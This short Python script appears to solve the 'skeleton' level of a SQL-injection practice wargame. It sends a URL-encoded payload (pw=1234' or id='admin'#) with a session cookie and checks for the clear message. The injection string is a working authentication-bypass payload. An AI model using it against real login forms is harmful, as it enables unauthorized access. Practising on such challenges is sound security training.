import requests
from dotenv import load_dotenv
import os

load_dotenv()
#EZ
url=os.environ.get('LOS_URL')+'chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=1234%27%20or%20id=%27admin%27%23'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "SKELETON Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)